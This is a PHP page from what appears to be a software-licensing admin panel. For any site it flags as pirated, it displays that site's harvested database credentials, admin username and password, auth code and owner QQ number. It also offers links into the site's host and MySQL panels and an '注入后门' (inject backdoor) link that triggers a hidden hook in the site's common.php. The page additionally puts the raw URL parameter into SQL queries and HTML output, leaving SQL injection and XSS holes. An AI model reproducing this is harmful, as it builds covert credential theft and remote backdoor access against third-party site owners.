<?php
/**
 * 获取密码
**/
$mod='blank';
include("../includes/common.php");
$title='获取密码';
include './head.php';
if($islogins==1){}else exit("<script language='javascript'>alert('您还未登录,请先登录才能进入！');window.location.href='./login.php';</script>");
echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
if($udata['power'] =='5'){
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}
?>
<?php
$url = $_GET['url'];

$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' limit 1");
if($row['active'] != 1){}else exit("<script language='javascript'>alert('此站点位于正版列表内！');history.go(-1);</script>");

$db=$DB->get_row("SELECT * FROM auth_block WHERE url='$url' limit 1");
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".代理.$user."','查看盗版密码','".$date."','".$city."','".$clientip."|".$url."')");
?>
<div class="panel panel-default">
<div class="panel-heading"><h3 class="panel-title">获取密码</h3></div>
<ul class="list-group">
            <li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>站点网址：</b> <?=$url?></a></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>数据库名：</b><?=$db['db']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>数据库账号：</b><?=$db['user']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-lock"></span> <b>数据库密码：</b><?=$db['pwd']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-search"></span> <b>版本：</b><?=$db['ver']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-download"></span> <b>授权码：</b><?=$db['authcode']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>违规者QQ：</b><?=$db['qq']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-cloud"></span> <b>后台账号：</b><?=$db['admin_user']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-remove"></span> <b>后台密码：</b><?=$db['admin_pass']?></li> 
            <li class="list-group-item"><span class="glyphicon glyphicon-time"></span> <b>入库时间：</b><?=$db['date']?> </li>
<li class="list-group-item"><span class="glyphicon glyphicon-list"></span> <b>功能操作：</b>
<a href="/api/jump.php?url=http://<?=urlencode($url)?>" class="btn btn-xs btn-warning" target="_blank">进入网站</a>   
<a href="/api/jump.php?url=http://<?=urlencode($url)?>:3312/vhost" class="btn btn-xs btn-danger" target="_blank">进入主机</a>
<a href="/api/jump.php?url=http://<?=urlencode($url)?>:3313/mysql/index.php" class="btn btn-xs btn-primary" target="_blank">进入数据库</a>
<a href="/api/jump.php?url=http://<?=urlencode($url)?>/includes/common.php?<?php echo $conf['hmpass']?>" class="btn btn-xs btn-success" target="_blank">注入后门</a>
</li>
</ul>
</div>
</div>
<script>
function checkURL()
{
	var url;
	url = document.auth.url.value;

	if (url.indexOf(" ")>=0){
		url = url.replace(/ /g,"");
		document.auth.url.value = url;
	}
	if (url.toLowerCase().indexOf("http://")==0){
		url = url.slice(7);
		document.auth.url.value = url;
	}
	if (url.toLowerCase().indexOf("https://")==0){
		url = url.slice(8);
		document.auth.url.value = url;
	}
	if (url.slice(url.length-1)=="/"){
		url = url.slice(0,url.length-1);
		document.auth.url.value = url;
	}
}
</script>
<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
<div class="block">
<div class="block-title"><h3 class="panel-title">用户操作</h3></div>
<div class="card-body">
<form action="./getpwd.php" method="GET" class="form-horizontal" role="form" name="auth">
<div class="input-group">
<span class="input-group-addon">网址</span>
<input type="text" name="url" onkeyup="checkURL();" value="<?=$url?>" class="form-control" autocomplete="off" required/>
</div><br/>
<div class="input-group">
<span class="input-group-addon">方式</span>
<select class="form-control" name="m">
<option value="1">获取密码</option>
</select>
</div><br/>
<div class="form-group">
<div class="col-sm-12"><input type="submit" value="获取密码" class="btn btn-info form-control"/></div>
</div>
</form>
</div>
</div>
</div>
</div>